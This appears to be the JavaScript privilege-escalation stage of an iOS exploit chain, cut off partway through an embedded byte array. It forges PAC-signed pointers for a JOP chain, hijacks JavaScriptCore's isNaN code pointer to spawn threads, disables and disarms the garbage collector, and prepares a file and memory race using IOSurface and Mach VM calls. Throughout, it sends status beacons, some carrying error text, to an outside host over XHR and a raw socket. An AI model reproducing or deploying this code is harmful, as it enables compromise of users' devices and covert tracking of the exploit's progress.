(() => {
  // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
  try {
    if (typeof XMLHttpRequest !== 'undefined') {
      let xhr = new XMLHttpRequest();
      xhr.open("GET", "https://zeroxjf.github.io/lightsaber/beacon?s=xhr_start", false);
      xhr.send();
    }
  } catch(e) {}

  // Define LOG if not already defined (pe_stage1 sets it to undefined)
  if (typeof LOG === 'undefined' || LOG === undefined) {
    LOG = function(msg) { console.log('[PE] ' + msg); };
  }

  try {
    fcall_init();
  } catch(e) {
    // Try to report fcall_init failure via XHR
    try {
      if (typeof XMLHttpRequest !== 'undefined') {
        let xhr = new XMLHttpRequest();
        xhr.open("GET", "https://zeroxjf.github.io/lightsaber/beacon?s=fcall_init_failed&e=" + encodeURIComponent(String(e)), false);
        xhr.send();
      }
    } catch(e2) {}
    throw e; // re-throw
  }

  // Beacon after fcall_init succeeds
  try {
    if (typeof XMLHttpRequest !== 'undefined') {
      let xhr = new XMLHttpRequest();
      xhr.open("GET", "https://zeroxjf.github.io/lightsaber/beacon?s=fcall_init_ok", false);
      xhr.send();
    }
  } catch(e) {}
  let PAGE_SIZE = 0x4000n;
  let KERN_SUCCESS = 0n;
  let CALLOC = func_resolve("calloc");
  let MALLOC = func_resolve("malloc");
  let FREE = func_resolve("free");
  let MEMCPY = func_resolve("memcpy");
  let MEMSET = func_resolve("memset");
  let SLEEP = func_resolve("sleep");
  let USLEEP = func_resolve("usleep");
  let STRCMP = func_resolve("strcmp");
  let STRCPY = func_resolve("strcpy");
  let STRNCPY = func_resolve("strncpy");
  let SNPRINTF = func_resolve("snprintf");
  let PRINTF = func_resolve("printf");
  let ERRNO = func_resolve("errno");
  let CLOSE = func_resolve("close");
  let EXIT = func_resolve("exit");
  let GETCHAR = func_resolve("getchar");
  let GETPID = func_resolve("getpid");
  let SYSCALL = func_resolve("syscall");
  let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
  let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
  let MACH_ERROR_STRING = func_resolve("mach_error_string");
  let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
  let kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");
  function assert(a, b = "N/A") {
    if (!a) {
      throw new Error(`assert failed: ${b}`);
    }
  }
  function ERROR(a) {
    throw new Error(a);
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function mach_task_self() {
    return 0x203n;
  }
  function calloc(...args) {
    return fcall(CALLOC, ...args);
  }
  function malloc(...args) {
    return fcall(MALLOC, ...args);
  }
  function free(...args) {
    return fcall(FREE, ...args);
  }
  function memcpy(...args) {
    return fcall(MEMCPY, ...args);
  }
  function memset(...args) {
    return fcall(MEMSET, ...args);
  }
  function sleep(...args) {
    return fcall(SLEEP, ...args);
  }
  function usleep(...args) {
    return fcall(USLEEP, ...args);
  }
  function strcmp(...args) {
    return fcall(STRCMP, ...args);
  }
  function strcpy(...args) {
    return fcall(STRCPY, ...args);
  }
  function strncpy(...args) {
    return fcall(STRNCPY, ...args);
  }
  function snprintf(...args) {
    return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function printf(...args) {
    return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function close(...args) {
    return fcall(CLOSE, ...args);
  }
  function exit(...args) {
    return fcall(EXIT, ...args);
  }
  function getchar(...args) {
    return fcall(GETCHAR, ...args);
  }
  function getpid(...args) {
    return fcall(GETPID, ...args);
  }
  function syscall(num, ...args) {
    return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function mach_vm_allocate(...args) {
    return fcall(MACH_VM_ALLOCATE, ...args);
  }
  function mach_vm_deallocate(...args) {
    return fcall(MACH_VM_DEALLOCATE, ...args);
  }
  function mach_error_string(...args) {
    return fcall(MACH_ERROR_STRING, ...args);
  }
  function mach_port_allocate(...args) {
    return fcall(MACH_PORT_ALLOCATE, ...args);
  }
  let g_device_machine = 0n;
  function get_device_machine() {
    LOG("[PE-DBG] get_device_machine() called");
    if (g_device_machine == 0n) {
      LOG("[PE-DBG] calling calloc...");
      let utsname = calloc(256n, 5n);
      LOG("[PE-DBG] calloc returned: " + utsname.hex());
      LOG("[PE-DBG] calling uname...");
      fcall(UNAME, utsname);
      LOG("[PE-DBG] uname returned");
      g_device_machine = utsname + 256n * 4n;
    }
    return g_device_machine;
  }
  let OBJC_ALLOC = func_resolve("objc_alloc");
  let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
  let OBJC_GETCLASS = func_resolve("objc_getClass");
  let OBJC_MSGSEND = func_resolve("objc_msgSend");
  let SEL_REGISTERNAME = func_resolve("sel_registerName");
  let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
  let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
  let CFNUMBERCREATE = func_resolve("CFNumberCreate");
  let CFRELEASE = func_resolve("CFRelease");
  let CFSHOW = func_resolve("CFShow");
  let CFSTRINGCREATECOPY = func_resolve("CFStringCreateCopy");
  let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
  let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault").noPAC());
  let kCFStringEncodingUTF8 = 0x08000100n;
  let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
  let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();
  function CFDictionaryCreateMutable(...args) {
    return fcall(CFDICTIONARYCREATEMUTABLE, ...args);
  }
  function CFDictionarySetValue(...args) {
    return fcall(CFDICTIONARYSETVALUE, ...args);
  }
  function CFNumberCreate(...args) {
    return fcall(CFNUMBERCREATE, ...args);
  }
  function CFRelease(...args) {
    return fcall(CFRELEASE, ...args);
  }
  function CFShow(...args) {
    return fcall(CFSHOW, ...args);
  }
  function CFStringCreateCopy(...args) {
    return fcall(CFSTRINGCREATECOPY, ...args);
  }
  function CFStringCreateWithCString(...args) {
    return fcall(CFSTRINGCREATEWITHCSTRING, ...args);
  }
  function objc_alloc(class_obj) {
    return fcall(OBJC_ALLOC, class_obj);
  }
  function objc_alloc_init(class_obj) {
    return fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function objc_getClass(class_name) {
    return fcall(OBJC_GETCLASS, get_cstring(class_name));
  }
  function objc_msgSend(...args) {
    return fcall(OBJC_MSGSEND, ...args);
  }
  function sel_registerName(cstr) {
    return fcall(SEL_REGISTERNAME, cstr);
  }
  let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
  let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
  let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
  let selector_invoke = sel_registerName(get_cstring("invoke"));
  let selector_isFinished = sel_registerName(get_cstring("isFinished"));
  let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
  let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
  let selector_release = sel_registerName(get_cstring("release"));
  let selector_retainCount = sel_registerName(get_cstring("retainCount"));
  let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
  let selector_start = sel_registerName(get_cstring("start"));
  let invoke_class = objc_getClass("NSInvocation");
  let jsc_class = objc_getClass("JSContext");
  let nsthread_class = objc_getClass("NSThread");
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }
  let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
  let cfstr_control_array = create_cfstring(get_cstring("control_array"));
  let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
  let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
  let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
  let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
  let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
  let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
  function create_cfstring_copy(cfstring) {
    return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
  }
  function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);
  }
  function object_release(obj) {
    return objc_msgSend(obj, selector_release);
  }
  function objectForKeyedSubscript(obj, cfstr_key) {
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
  }
  function evaluateScript(obj, jscript) {
    return objc_msgSend(obj, selector_evaluateScript, jscript);
  }
  function methodSignatureForSelector(obj, sel) {
    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
  }
  function invocationWithMethodSignature(obj, sig) {
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
  }
  function setArgument_atIndex(obj, arg, idx) {
    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
  }
  function initWithTarget_selector_object(obj, target, sel, object) {
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
  }
  function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
  }
  function setup_fcall_jopchain() {
    let jsvm_fcall_buff = malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return {
      "jsvm_fcall_buff": jsvm_fcall_buff,
      "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
      "jsvm_fcall_args": jsvm_fcall_args
    };
  }
  let evaluateScript_invocation = 0n;
  function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
    if (typeof js_script_nsstring === "string") {
      js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
    } else if (typeof js_script_nsstring === "object") {
      js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
    } else {
      js_script_nsstring = create_cfstring_copy(js_script_nsstring);
    }
    let jop_chain_info = setup_fcall_jopchain();
    let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
    let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
    let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
    let ctx = objc_alloc_init(jsc_class);
    let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
    let isnan_func_addr = uread64(isnan_value + 0x8n);
    let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    evaluateScript(ctx, stage1_js);
    let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
    let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
    let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
    let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
    uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
    let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
    let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
    let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
    let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
    uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
    let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
    let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
    let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
    uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    uwrite64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
    let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
    memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE);
    uwrite64(new_func_offsets_buffer + 3n * 0x8n, target_thread_arg);
    uwrite64(new_func_offsets_buffer + 5n * 0x8n, jsvm_fcall_buff);
    uwrite64(new_func_offsets_buffer + 6n * 0x8n, jsvm_fcall_pc);
    uwrite64(new_func_offsets_buffer + 7n * 0x8n, jsvm_fcall_args);
    if (evaluateScript_invocation == 0n) {
      let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
      evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
      setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
    }
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);
    let nsthread = objc_alloc(nsthread_class);
    initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
    nsthread_start(nsthread);
    return {
      "thread_handle": nsthread,
      "js_ctx": ctx,
      "jop_chain_info": jop_chain_info,
      "js_script_nsstring": js_script_nsstring,
      "rw_array_buffer_bk": rw_array_buffer_bk,
      "control_array_buffer_bk": control_array_buffer_bk,
      "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
      "control_array_8_buffer_bk": control_array_8_buffer_bk
    };
  }
  function js_thread_join(js_thread) {
    let jop_chain_info = js_thread["jop_chain_info"];
    let js_ctx = js_thread["js_ctx"];
    let js_script_nsstring = js_thread["js_script_nsstring"];
    let nsthread = js_thread["thread_handle"];
    while (true) {
      let isFinished = objc_msgSend(nsthread, selector_isFinished);
      if (isFinished == 1n) {
        break;
      }
    }
    object_release(nsthread);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n, js_thread["control_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n, js_thread["rw_array_8_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n, js_thread["control_array_8_buffer_bk"]);
    let jsc_ref_count = object_retainCount(js_ctx);
    for (let i = 0n; i < jsc_ref_count; i++) {
      object_release(js_ctx);
    }
    CFRelease(js_script_nsstring);
    free(jop_chain_info["jsvm_fcall_buff"]);
  }
  let RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
  let VM_FLAGS_ANYWHERE = 1n;
  let VM_FLAGS_FIXED = 0n;
  let VM_FLAGS_OVERWRITE = 0x4000n;
  let VM_FLAGS_RANDOM_ADDR = 8n;
  let VM_INHERIT_NONE = 2n;
  let VM_PROT_DEFAULT = 3n;
  let PROT_READ = 0x1n;
  let PROT_WRITE = 0x2n;
  let MAP_SHARED = 0x1n;
  let AF_INET6 = 30n;
  let SOCK_DGRAM = 2n;
  let IPPROTO_ICMPV6 = 58n;
  let ICMP6_FILTER = 18n;
  let SEEK_SET = 0n;
  let _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
  let ACCESS = func_resolve("access");
  let CONFSTR = func_resolve("confstr");
  let FCNTL = func_resolve("fcntl");
  let FSYNC = func_resolve("fsync");
  let FILEPORT_MAKEFD = func_resolve("fileport_makefd");
  let FILEPORT_MAKEPORT = func_resolve("fileport_makeport");
  let FOPEN = func_resolve("fopen");
  let FCLOSE = func_resolve("fclose");
  let FWRITE = func_resolve("fwrite");
  let GETSOCKOPT = func_resolve("getsockopt");
  let LSEEK = func_resolve("lseek");
  let MACH_THREAD_SELF = func_resolve("mach_thread_self");
  let MEMMEM = func_resolve("memmem");
  let MEMSET_PATTERN8 = func_resolve("memset_pattern8");
  let OPEN = func_resolve("open");
  let PREADV = func_resolve("preadv");
  let PWRITEV = func_resolve("pwritev");
  let PWRITE = func_resolve("pwrite");
  let PREAD = func_resolve("pread");
  let READ = func_resolve("read");
  let SETSOCKOPT = func_resolve("setsockopt");
  let SOCKET = func_resolve("socket");
  let STRCAT = func_resolve("strcat");
  let STRSTR = func_resolve("strstr");
  let STRLEN = func_resolve("strlen");
  let STRNCMP = func_resolve("strncmp");
  let STRRCHR = func_resolve("strrchr");
  let PTHREAD_SELF = func_resolve("pthread_self");
  let PTHREAD_JOIN = func_resolve("pthread_join");
  let WRITE = func_resolve("write");
  let REMOVE = func_resolve("remove");
  let ARC4RANDOM = func_resolve("arc4random");
  let TASK_THREADS = func_resolve("task_threads");
  let THREAD_SUSPEND = func_resolve("thread_suspend");
  let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
  let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
  let MACH_VM_MAP = func_resolve("mach_vm_map");
  let MMAP = func_resolve("mmap");
  let MLOCK = func_resolve("mlock");
  let MUNLOCK = func_resolve("munlock");
  let UNAME = func_resolve("uname");
  let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
  let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
  let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
  // Early beacon - test if basic setup works
  try {
    let _CONNECT = func_resolve("connect");
    let _sock = fcall(SOCKET, 2n, 1n, 0n);
    if (_sock != 0xFFFFFFFFFFFFFFFFn && _sock >= 0n) {
      let _addr = fcall(CALLOC, 1n, 16n);
      fcall(MEMSET, _addr, 0n, 16n);
      uwrite16(_addr, 2n);
      uwrite16(_addr + 2n, 0xBB01n); // port 443 big-endian
      uwrite32(_addr + 4n, 0x996CC7B9n); // 185.199.108.153
      if (fcall(_CONNECT, _sock, _addr, 16n) == 0n) {
        let _req = get_cstring("GET /lightsaber/beacon?s=early HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n");
        fcall(WRITE, _sock, _req, 68n);
      }
      fcall(CLOSE, _sock);
      fcall(FREE, _addr);
    }
  } catch(e) {}
  let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
  function DUMP(addr, sz) {}
  function js_malloc(sz) {
    buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
    return uread64(mem.addrof(buff) + 0x10n);
  }
  function mach_thread_self() {
    return fcall(MACH_THREAD_SELF);
  }
  function pthread_getspecific(key) {
    return fcall(PTHREAD_GETSPECIFIC, key);
  }
  function pthread_self() {
    return fcall(PTHREAD_SELF);
  }
  function pthread_join(thr, val) {
    return fcall(PTHREAD_JOIN, thr, val);
  }
  function _NSGetExecutablePath(executable_path, length_ptr) {
    return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
  }
  function confstr(name, buf, len) {
    return fcall(CONFSTR, name, buf, len);
  }
  function strrchr(s, c) {
    return fcall(STRRCHR, s, c);
  }
  function strcat(s1, s2) {
    return fcall(STRCAT, s1, s2);
  }
  function strlen(s) {
    return fcall(STRLEN, s);
  }
  function strstr(s1, s2) {
    return fcall(STRSTR, s1, s2);
  }
  function strncmp(s1, s2, n) {
    return fcall(STRNCMP, s1, s2, n);
  }
  function socket(domain, type, protocol) {
    return fcall(SOCKET, domain, type, protocol);
  }
  function getsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(GETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function setsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(SETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function fileport_makeport(fd, port) {
    return fcall(FILEPORT_MAKEPORT, fd, port);
  }
  function fileport_makefd(port) {
    return fcall(FILEPORT_MAKEFD, port);
  }
  function memset_pattern8(buf, val, sz) {
    return fcall(MEMSET_PATTERN8, buf, val, sz);
  }
  function memmem(big, big_len, little, little_len) {
    return fcall(MEMMEM, big, big_len, little, little_len);
  }
  function access(path, mode) {
    return fcall(ACCESS, path, mode);
  }
  function open(path, mode) {
    return fcall(OPEN, path, mode);
  }
  function fopen(path, mode) {
    return fcall(FOPEN, path, mode);
  }
  function fclose(fd) {
    return fcall(FCLOSE, fd);
  }
  function fwrite(buf, sz, nitem, fd) {
    return fcall(FWRITE, buf, sz, nitem, fd);
  }
  function preadv(fildes, iov, iovcnt, offset) {
    return fcall(PREADV, fildes, iov, iovcnt, offset);
  }
  function pwritev(fildes, iov, iovcnt, offset) {
    return fcall(PWRITEV, fildes, iov, iovcnt, offset);
  }
  function pwrite(fildes, buff, size, offset) {
    return fcall(PWRITE, fildes, buff, size, offset);
  }
  function pread(fildes, buff, size, offset) {
    return fcall(PREAD, fildes, buff, size, offset);
  }
  function read(fd, buf, sz) {
    return fcall(READ, fd, buf, sz);
  }
  function write(fd, buf, sz) {
    return fcall(WRITE, fd, buf, sz);
  }
  function remove(path) {
    return fcall(REMOVE, path);
  }
  function arc4random() {
    return fcall(ARC4RANDOM);
  }
  function task_threads(task, thread_list_addr, thread_count_addr) {
    return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
  }
  function fcntl(fd, flag, value) {
    return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
  }
  function lseek(fildes, offset, whence) {
    return fcall(LSEEK, fildes, offset, whence);
  }
  function fsync(fd) {
    return fcall(FSYNC, fd);
  }
  function CFStringCreateWithCString(allocator, cstring, encoding) {
    return fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
  }
  function CFStringCreateCopy(allocator, cfstring) {
    return fcall(CFSTRINGCREATECOPY, allocator, cfstring);
  }
  function CFDictionarySetValue(dict, key, value) {
    return fcall(CFDICTIONARYSETVALUE, dict, key, value);
  }
  function CFNumberCreate(allocator, theType, valuePtr) {
    return fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
  }
  function IOSurfaceCreate(dict) {
    return fcall(IOSURFACECREATE, dict);
  }
  function IOSurfaceGetBaseAddress(surface) {
    return fcall(IOSURFACEGETBASEADDRESS, surface);
  }
  function IOSurfacePrefetchPages(surface) {
    return fcall(IOSURFACEPREFETCHPAGES, surface);
  }
  function CFRelease(obj) {
    return fcall(CFRELEASE, obj);
  }
  function CFShow(obj) {
    return fcall(CFSHOW, obj);
  }
  function mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry) {
    return fcall(MACH_MAKE_MEMORY_ENTRY_64, target_task, size, offset, permission, object_handle, parent_entry);
  }
  function mach_vm_map(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance) {
    return fcall(MACH_VM_MAP, target_task, address, size, mask, flags, object, offset, copy, cur_protection | max_protection << 32n, inheritance);
  }
  function mmap(addr, len, prot, flags, fd, offset) {
    return fcall(MMAP, addr, len, prot, flags, fd, offset);
  }
  function mlock(address, size) {
    return fcall(MLOCK, address, size);
  }
  function munlock(address, size) {
    return fcall(MUNLOCK, address, size);
  }
  function mach_port_deallocate(task, name) {
    return fcall(MACH_PORT_DEALLOCATE, task, name);
  }
  function mach_task_self() {
    return 0x203n;
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function disable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 0n);
  }
  function enable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 1n);
  }
  function disarm_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let m_threadGroup = uread64(heap + 0x198n);
    let threads = uread64(m_threadGroup);
    uwrite64(threads + 0x20n, 0x0n);
  }
  disable_gc();
  disarm_gc();
  enable_gc();
  let executable_name = 0n;
  let read_file_path = 0n;
  let write_file_path = 0n;
  let target_file_size = PAGE_SIZE * 0x2n;
  let oob_offset = 0x100n;
  let oob_size = 0xf00n;
  let n_of_oob_pages = 2n;
  let pc_address = new_bigint();
  let pc_size = 0n;
  let pc_object = new_bigint();
  let free_target = 0n;
  let free_target_size = 0n;
  let write_fd = 0n;
  let read_fd = 0n;
  let random_marker = arc4random() << 32n | arc4random();
  let wired_page_marker = arc4random() << 32n | arc4random();
  let free_thread_start_ptr = 0n;
  let free_target_sync_ptr = 0n;
  let free_target_size_sync_ptr = 0n;
  let target_object_sync_ptr = 0n;
  let target_object_offset_sync_ptr = 0n;
  let go_sync_ptr = 0n;
  let race_sync_ptr = 0n;
  let free_thread_jsthread = 0n;
  let free_thread_arg = 0n;
  function init_target_file() {
    let _CS_DARWIN_USER_TEMP_DIR = 65537n;
    read_file_path = calloc(1n, 1024n);
    write_file_path = calloc(1n, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
    strcat(read_file_path, get_cstring(`/${arc4random().hex()}`));
    strcat(write_file_path, get_cstring(`/${arc4random().hex()}`));
    create_target_file(read_file_path);
    create_target_file(write_file_path);
    read_fd = open(read_file_path, 0x2n);
    write_fd = open(write_file_path, 0x2n);
    LOG("[+] read_fd: " + read_fd.hex());
    LOG("[+] write_fd: " + write_fd.hex());
    remove(read_file_path);
    remove(write_file_path);
    fcntl(read_fd, 48n, 1n);
    fcntl(write_fd, 48n, 1n);
  }
  function pe_init() {
    init_target_file();
    if (executable_name == 0n) {
      let length = BigInt("0x1024");
      let executable_path = calloc(1n, length);
      _NSGetExecutablePath(executable_path, get_bigint_addr(length));
      executable_name = strrchr(executable_path, 0x2fn);
      if (executable_name != 0n) {
        executable_name = executable_name + 0x1n;
      } else {
        executable_name = executable_path;
      }
    }
    free_thread_arg = calloc(1n, PAGE_SIZE);
    LOG("[+] free_thread_arg: " + free_thread_arg.hex());
    free_thread_start_ptr = free_thread_arg;
    free_target_sync_ptr = free_thread_arg + 0x8n;
    free_target_size_sync_ptr = free_thread_arg + 0x10n;
    target_object_sync_ptr = free_thread_arg + 0x18n;
    target_object_offset_sync_ptr = free_thread_arg + 0x20n;
    go_sync_ptr = free_thread_arg + 0x28n;
    race_sync_ptr = free_thread_arg + 0x30n;
    let free_thread_js_data = new Uint8Array([102, 99, 97, 108, 108, 95, 105, 110, 105, 116, 40, 41, 59, 10, 108, 101, 116, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 32, 32, 32, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 67, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 82, 69, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 114, 101, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 69, 77, 67, 80, 89, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 34, 41, 59, 10, 10, 108, 101, 116, 32, 83, 76, 69, 69, 80, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 85, 83, 76, 69, 69, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 77, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 80, 89, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 